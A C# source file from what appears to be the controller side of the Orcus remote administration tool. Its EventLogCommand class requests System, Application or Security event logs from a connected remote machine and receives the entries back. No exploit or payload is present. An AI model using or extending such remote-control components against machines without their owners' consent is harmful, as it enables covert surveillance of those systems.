using System;
using System.Collections.Generic;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.EventLog;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.EventLog
{
    [DescribeCommandByEnum(typeof (EventLogCommunication))]
    public class EventLogCommand : Command
    {
        public event EventHandler<EventLogReceivedEventArgs> EventLogReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((EventLogCommunication) parameter[0])
            {
                case EventLogCommunication.ResponseEventLogEntries:
                    var serializer = new Serializer(typeof (List<EventLogEntry>));
                    var entries = serializer.Deserialize<List<EventLogEntry>>(parameter, 5);
                    var index = BitConverter.ToInt32(parameter, 1);

                    EventLogReceived?.Invoke(this, new EventLogReceivedEventArgs(entries, index));
                    LogService.Receive(string.Format((string) Application.Current.Resources["ReceivedEventLog"],
                        entries.Count));
                    break;
                case EventLogCommunication.ResponseNoAdministratorRights:
                    LogService.Error((string) Application.Current.Resources["NoAdminPrivileges"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void RequestEventLog(EventLogType eventLogType, int index)
        {
            switch (eventLogType)
            {
                case EventLogType.System:
                    LogService.Send((string) Application.Current.Resources["GetSystemEventLog"]);
                    break;
                case EventLogType.Application:
                    LogService.Send((string) Application.Current.Resources["GetApplicationEventLog"]);
                    break;
                case EventLogType.Security:
                    LogService.Send((string) Application.Current.Resources["GetSecurityEventLog"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(eventLogType), eventLogType, null);
            }

            var data = new byte[6];
            data[0] = (byte) EventLogCommunication.RequestEventLog;
            data[1] = (byte) eventLogType;
            Array.Copy(BitConverter.GetBytes(index), 0, data, 2, 4);

            ConnectionInfo.SendCommand(this, data);
        }

        public void LoadMoreEntries()
        {
            LogService.Send((string) Application.Current.Resources["LoadMoreEventLogEntries"]);
        }

        protected override uint GetId()
        {
            return 6;
        }
    }

    public class EventLogReceivedEventArgs : EventArgs
    {
        public EventLogReceivedEventArgs(List<EventLogEntry> eventLogEntries, int index)
        {
            EventLogEntries = eventLogEntries;
            Index = index;
        }

        public int Index { get; }
        public List<EventLogEntry> EventLogEntries { get; }
    }
}